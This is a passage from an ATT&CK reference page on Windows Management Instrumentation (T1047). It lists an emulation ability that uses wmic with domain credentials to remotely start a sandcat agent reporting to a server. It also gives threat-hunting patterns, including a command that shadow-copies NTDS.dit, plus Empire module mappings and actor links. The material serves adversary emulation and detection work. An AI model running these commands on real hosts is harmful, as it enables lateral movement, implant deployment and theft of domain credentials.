                                                                          'executes '
                                                                          '54ndc47 '
                                                                          'over '
                                                                          'WMI',
                                                           'id': 'ece5dde3-d370-4c20-b213-a1f424aa8d03',
                                                           'name': 'Start '
                                                                   '54ndc47 '
                                                                   '(WMI)',
                                                           'platforms': {'windows': {'psh': {'cleanup': 'wmic '
                                                                                                        '/node:`"#{remote.host.fqdn}`" '
                                                                                                        '/user:#{domain.user.name} '
                                                                                                        '/password:#{domain.user.password} '
                                                                                                        'process '
                                                                                                        'call '
                                                                                                        'create '
                                                                                                        '"taskkill '
                                                                                                        '/f '
                                                                                                        '/im '
                                                                                                        's4ndc4t.exe"\n',
                                                                                             'command': 'wmic '
                                                                                                        '/node:`"#{remote.host.fqdn}`" '
                                                                                                        '/user:#{domain.user.name} '
                                                                                                        '/password:#{domain.user.password} '
                                                                                                        'process '
                                                                                                        'call '
                                                                                                        'create '
                                                                                                        '"powershell.exe '
                                                                                                        'C:\\Users\\Public\\s4ndc4t.exe '
                                                                                                        '-server '
                                                                                                        '#{server} '
                                                                                                        '-group '
                                                                                                        '#{group} '
                                                                                                        '-executors '
                                                                                                        'psh";\n'}}},
                                                           'requirements': [{'plugins.stockpile.app.requirements.basic': [{'edge': 'has_password',
                                                                                                                           'source': 'domain.user.name',
                                                                                                                           'target': 'domain.user.password'}]},
                                                                            {'plugins.stockpile.app.requirements.basic': [{'edge': 'has_54ndc47_copy',
                                                                                                                           'source': 'remote.host.fqdn'}]},
                                                                            {'plugins.stockpile.app.requirements.no_backwards_movement': [{'source': 'remote.host.fqdn'}]}],
                                                           'tactic': 'execution',
                                                           'technique': {'attack_id': 'T1047',
                                                                         'name': 'Windows '
                                                                                 'Management '
                                                                                 'Instrumentation'}}},
 {'Threat Hunting Tables': {'chain_id': '100098',
                            'commandline_string': '/NODE:*process call create*',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': 'f86c9d4c4b0afad1bb812fff0191b50c731760494ed45986e93b858daf386226',
                            'loaded_dll': '',
                            'mitre_attack': 'T1047',
                            'mitre_caption': 'wmi',
                            'os': 'windows',
                            'parent_process': 'wmic.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100099',
                            'commandline_string': '/NODE:*path '
                                                  'AntiVirusProduct get*',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1047',
                            'mitre_caption': 'wmi',
                            'os': 'windows',
                            'parent_process': 'wmic.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100100',
                            'commandline_string': '/NODE:*path FirewallProduct '
                                                  'get*',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1047',
                            'mitre_caption': 'wmi',
                            'os': 'windows',
                            'parent_process': 'wmic.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100102',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'high',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1047',
                            'mitre_caption': 'wmi',
                            'os': 'windows',
                            'parent_process': 'WmiPrvSE.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100171',
                            'commandline_string': '/NODE: "192.168.0.1" '
                                                  'process call create "*.exe"',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1047',
                            'mitre_caption': 'execution',
                            'os': 'windows',
                            'parent_process': 'wmic.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100172',
                            'commandline_string': '/node:REMOTECOMPUTERNAME '
                                                  'PROCESS call create "at '
                                                  '9:00PM <path> ^> <path>"',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1047',
                            'mitre_caption': 'execution',
                            'os': 'windows',
                            'parent_process': 'wmic.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100173',
                            'commandline_string': '/node:REMOTECOMPUTERNAME '
                                                  'PROCESS call create "cmd /c '
                                                  'vssadmin create shadow '
                                                  '/for=C:\\Windows\\NTDS\\NTDS.dit '
                                                  '> c:\\not_the_NTDS.dit"',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1047',
                            'mitre_caption': 'execution',
                            'os': 'windows',
                            'parent_process': 'wmic.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1047',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/lateral_movement/invoke_wmi":  '
                                                                                 '["T1047"],',
                                            'Empire Module': 'powershell/lateral_movement/invoke_wmi',
                                            'Technique': 'Windows Management '
                                                         'Instrumentation'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1047',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/persistence/elevated/wmi":  '
                                                                                 '["T1047"],',
                                            'Empire Module': 'powershell/persistence/elevated/wmi',
                                            'Technique': 'Windows Management '
                                                         'Instrumentation'}}]
```

# Tactics


* [Execution](../tactics/Execution.md)


# Mitigations

None

# Actors


* [menuPass](../actors/menuPass.md)

* [Deep Panda](../actors/Deep-Panda.md)
    
* [OilRig](../actors/OilRig.md)
    
* [MuddyWater](../actors/MuddyWater.md)
    
* [Leviathan](../actors/Leviathan.md)
    
* [APT29](../actors/APT29.md)
    
* [Threat Group-3390](../actors/Threat-Group-3390.md)
    
* [FIN8](../actors/FIN8.md)
    
* [Stealth Falcon](../actors/Stealth-Falcon.md)
    
* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [APT32](../actors/APT32.md)
    
* [Soft Cell](../actors/Soft-Cell.md)
    
* [FIN6](../actors/FIN6.md)
    
* [APT41](../actors/APT41.md)
    
